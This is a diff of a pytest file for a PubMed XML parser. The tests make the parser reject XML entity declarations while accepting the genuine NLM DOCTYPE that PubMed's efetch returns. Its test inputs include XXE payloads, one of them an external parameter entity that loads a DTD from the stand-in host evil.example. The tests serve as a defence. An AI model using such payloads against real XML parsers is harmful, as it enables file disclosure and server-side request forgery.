@@ -122,15 +122,27 @@ def test_parse_without_abstract_or_doi_is_honest():
 @pytest.mark.parametrize(
     "xml",
     [
-        "<!DOCTYPE PubmedArticleSet><PubmedArticleSet/>",
         '<!DOCTYPE x [<!ENTITY e "boom">]><PubmedArticleSet>&e;</PubmedArticleSet>',
         '<PubmedArticleSet><!ENTITY e "boom"></PubmedArticleSet>',
-        '<?xml version="1.0"?><!DoCtYpE x SYSTEM "http://evil.example/x.dtd"><x/>',
+        '<!DOCTYPE x [<!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p;]><PubmedArticleSet/>',
+        '<!doctype x [<!entity e "boom">]><PubmedArticleSet/>',
     ],
 )
-def test_parse_rejects_dtd_before_parsing(xml):
-    with pytest.raises(pubmed.SourceError, match="DOCTYPE/ENTITY"):
+def test_parse_rejects_entity_declarations(xml):
+    with pytest.raises(pubmed.SourceError, match="ENTITY"):
         pubmed.parse_pubmed_xml(xml)
+
+def test_parse_accepts_real_nlm_doctype():
+    """efetch штатно отдаёт DOCTYPE со ссылкой на DTD NLM — это не атака."""
+    xml = (
+        '<?xml version="1.0" ?>\n'
+        '<!DOCTYPE PubmedArticleSet PUBLIC "-//NLM//DTD PubMedArticle, '
+        '1st January 2019//EN" '
+        '"https://dtd.nlm.nih.gov/ncbi/pubmed/out/pubmed_190101.dtd">\n'
+        + PUBMED_XML.split("?>", 1)[1].lstrip()
+    )
+    docs = pubmed.parse_pubmed_xml(xml)
+    assert docs and docs[0].external_id
 
 
 class _Body:
